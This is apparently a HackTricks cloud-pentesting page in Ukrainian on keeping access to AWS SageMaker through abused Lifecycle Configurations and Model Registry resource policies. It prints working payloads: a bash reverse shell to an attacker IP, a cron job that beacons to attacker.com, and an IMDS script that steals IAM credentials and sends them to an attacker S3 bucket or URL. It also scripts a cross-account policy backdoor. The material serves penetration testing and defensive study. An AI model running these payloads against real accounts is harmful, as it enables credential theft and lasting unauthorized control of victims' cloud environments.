# AWS - SageMaker Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд методів Persistence

У цьому розділі викладено методи отримання persistence у SageMaker шляхом зловживання Lifecycle Configurations (LCCs), включно з reverse shells, cron jobs, credential theft via IMDS та SSH backdoors. Ці скрипти виконуються з роллю IAM екземпляра і можуть зберігатися після перезапусків. Більшість технік вимагають вихідного мережевого доступу, проте використання сервісів на AWS control plane все ще може дозволити успіх, якщо середовище знаходиться в 'VPC-only" режимі.

> [!TIP]
> Примітка: SageMaker notebook instances по суті є керованими EC2 інстансами, налаштованими спеціально для робочих навантажень машинного навчання.

## Необхідні дозволи
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Studio додатки:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## Налаштування Lifecycle Configuration на Notebook Instances

### Приклади команд AWS CLI:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## Налаштування Lifecycle Configuration у SageMaker Studio

Lifecycle Configurations можна прикріплювати на різних рівнях та до різних типів додатків у SageMaker Studio.

### Studio Domain Level (Усі користувачі)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Studio Space Level (Індивідуальні або Спільні Spaces)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Типи конфігурацій життєвого циклу додатків Studio

Конфігурації життєвого циклу можуть бути застосовані до різних типів додатків SageMaker Studio:
* JupyterServer: Виконує скрипти під час старту Jupyter server, ідеально підходить для persistence mechanisms, таких як reverse shells та cron jobs.
* KernelGateway: Виконується під час запуску додатку KernelGateway, корисно для початкового налаштування або для постійного доступу.
* CodeEditor: Застосовується до Code Editor (Code-OSS), дозволяє скриптам виконуватися при початку сеансів редагування коду.

### Example Command for Each Type:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### Редактор коду
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### Критична інформація:
* Прикріплення LCCs на рівні domain або space впливає на всіх користувачів чи додатки в межах області.
* Вимагає підвищених дозволів (sagemaker:UpdateDomain, sagemaker:UpdateSpace); зазвичай простіше реалізується на рівні space, ніж на рівні domain.
* Контролі на мережевому рівні (наприклад, strict egress filtering) можуть перешкодити успішним reverse shells або data exfiltration.

## Reverse Shell через Lifecycle Configuration

SageMaker Lifecycle Configurations (LCCs) виконують користувацькі скрипти під час запуску notebook instances. Зловмисник із відповідними дозволами може встановити стійкий reverse shell.

### Payload Example:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Cron Job Persistence via Lifecycle Configuration

Зловмисник може інжектувати cron jobs через LCC scripts, забезпечуючи періодичне виконання зловмисних скриптів або команд, що дозволяє stealthy persistence.

### Payload Example:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Credential Exfiltration via IMDS (v1 & v2)

Конфігурації життєвого циклу можуть опитувати Instance Metadata Service (IMDS), щоб отримати IAM облікові дані та exfiltrate їх у розташування, контрольоване зловмисником.

### Payload Example:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```
## Утримання доступу через Model Registry resource policy (PutModelPackageGroupPolicy)

Зловживання політикою на основі ресурсу для SageMaker Model Package Group, щоб надати зовнішньому principal міжакаунтні права (наприклад, CreateModelPackage/Describe/List). Це створює довготривалий backdoor, який дозволяє завантажувати заражені версії моделей або читати метадані/артефакти моделей навіть якщо IAM user/role нападника в акаунті жертви буде видалено.

Required permissions
- sagemaker:CreateModelPackageGroup
- sagemaker:PutModelPackageGroupPolicy
- sagemaker:GetModelPackageGroupPolicy

Steps (us-east-1)
```bash
# 1) Create a Model Package Group
REGION=${REGION:-us-east-1}
MPG=atk-mpg-$(date +%s)
aws sagemaker create-model-package-group \
--region "$REGION" \
--model-package-group-name "$MPG" \
--model-package-group-description "Test backdoor"

# 2) Craft a cross-account resource policy (replace 111122223333 with attacker account)
cat > /tmp/mpg-policy.json <<JSON
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowCrossAccountCreateDescribeList",
"Effect": "Allow",
"Principal": {"AWS": ["arn:aws:iam::111122223333:root"]},
"Action": [
"sagemaker:CreateModelPackage",
"sagemaker:DescribeModelPackage",
"sagemaker:DescribeModelPackageGroup",
"sagemaker:ListModelPackages"
],
"Resource": [
"arn:aws:sagemaker:${REGION}:<VICTIM_ACCOUNT_ID>:model-package-group/${MPG}",
"arn:aws:sagemaker:${REGION}:<VICTIM_ACCOUNT_ID>:model-package/${MPG}/*"
]
}
]
}
JSON

# 3) Attach the policy to the group
aws sagemaker put-model-package-group-policy \
--region "$REGION" \
--model-package-group-name "$MPG" \
--resource-policy "$(jq -c . /tmp/mpg-policy.json)"

# 4) Retrieve the policy (evidence)
aws sagemaker get-model-package-group-policy \
--region "$REGION" \
--model-package-group-name "$MPG" \
--query ResourcePolicy --output text
```
Примітки
- Для реального міжакаунтного backdoor звужуйте Resource до конкретного group ARN і використовуйте attacker’s AWS account ID у Principal.
- Для end-to-end міжакаунтного розгортання або читання артефактів узгодьте S3/ECR/KMS grants з attacker account.

Вплив
- Persistent cross-account control of a Model Registry group: attacker може публікувати шкідливі версії моделей або перелічувати/читати метадані моделей навіть після того, як їхні IAM сутності будуть видалені у victim account.

## Canvas міжакаунтний backdoor для реєстру моделей (UpdateUserProfile.ModelRegisterSettings)

Зловживання налаштуваннями користувача SageMaker Canvas, щоб непомітно перенаправляти записи реєстру моделей в обліковий запис під контролем attacker шляхом увімкнення ModelRegisterSettings і вказання CrossAccountModelRegisterRoleArn на attacker role в іншому акаунті.

Необхідні дозволи
- sagemaker:UpdateUserProfile на цільовому UserProfile
- Необов'язково: sagemaker:CreateUserProfile на Domain, яким ви керуєте

{{#include ../../../../banners/hacktricks-training.md}}
